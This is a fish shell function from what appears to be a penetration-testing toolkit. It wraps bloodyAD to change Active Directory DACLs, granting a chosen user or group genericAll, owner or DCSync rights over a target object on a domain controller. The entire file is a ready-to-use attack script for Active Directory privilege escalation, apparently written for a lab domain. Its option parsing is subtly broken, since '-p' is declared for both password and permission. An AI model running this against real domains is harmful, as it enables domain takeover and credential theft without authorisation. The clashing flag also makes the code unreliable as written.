# description: Manipulate AD object DACLs using bloodyAD
function __kronos_dacl --description "Manipulate AD object DACLs using bloodyAD"
    argparse h/help u/username= p/password= k/kerberos t/target-object= m/member= a/action= p/permission= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos dacl [TARGET_DC] [OPTIONS]"
        echo ""
        echo "Manipulate Active Directory DACLs using bloodyAD."
        echo ""
        echo "Options:"
        echo "  -t, --target-object NAME Target AD object (e.g. 'DC=dante,DC=local' or 'p.user')"
        echo "  -m, --member NAME        The user/group to grant/revoke permissions to"
        echo "  -a, --action ACTION      Action to perform (add, remove, set) - default: add"
        echo "  -p, --permission PERM    Permission (genericAll, dcsync, owner, all) - default: genericAll"
        echo "  -u, --username USER      Auth username"
        echo "  -p, --password PASS      Auth password"
        echo "  -k, --kerberos           Use Kerberos authentication"
        echo "  -h, --help               Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"; set target $TGT_DC_IP; end
    if test -z "$target"; set target $TGT_DC; end
    if test -z "$target"; set target $TGT; end
    if test -z "$target"
        echo "error: target DC is required" >&2
        return 1
    end

    if not set -q _flag_target_object; or not set -q _flag_member
        echo "error: --target-object and --member are required" >&2
        return 1
    end

    set -l action "add"
    if set -q _flag_action; set action $_flag_action; end

    set -l permission "genericAll"
    if set -q _flag_permission; set permission $_flag_permission; end

    set -l domain $TGT_DC_DOMAIN
    if test -z "$domain"
        echo "error: \$TGT_DC_DOMAIN is not set" >&2
        return 1
    end

    set -l cmd_str bloodyAD --host "$target" -d "$domain"
    if set -q _flag_kerberos
        set -a cmd_str -k
    else
        set -l auth_user $_flag_username; if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
        if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end

        set -l auth_pass $_flag_password; if test -z "$auth_pass"; set auth_pass $TGT_PASSWORD; end
        if test -z "$auth_pass"; set auth_pass $TGT_CRED_PASSWORD; end

        if test -z "$auth_user"
            echo "error: auth credentials required" >&2
            return 1
        end
        set -a cmd_str -u "$auth_user" -p "$auth_pass"
    end

    set -a cmd_str $action dacl "$_flag_target_object" "$_flag_member" "$permission"

    echo "[*] Performing DACL $action ($permission) on $_flag_target_object for $_flag_member..."
    command $cmd_str
end
